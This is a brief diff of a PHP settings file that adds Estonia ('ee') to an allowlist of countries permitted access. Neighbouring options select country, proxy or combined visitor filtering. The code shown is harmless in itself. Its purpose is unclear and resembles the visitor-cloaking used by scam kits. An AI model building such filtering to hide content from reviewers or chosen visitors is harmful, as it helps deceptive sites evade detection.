@@ -63,7 +63,7 @@ $parameter = 2; // 1 => Both , 2 => Country , 3 => Proxy , 4 => Simple
 $wordpress = true; // Allow Wordpress Include
 $checkfileup = false; // Check Link UP
 
-$country = array("ma","py","gr","at","za","cz","fi","cy","be","de","pl","ua","ch","hr"); #Country's Allowed To Access
+$country = array("ma","py","gr","at","za","cz","fi","cy","be","de","pl","ua","ch","hr","ee"); #Country's Allowed To Access
 
 /************************************************************* PARAMETRES ******************************************************************/
 
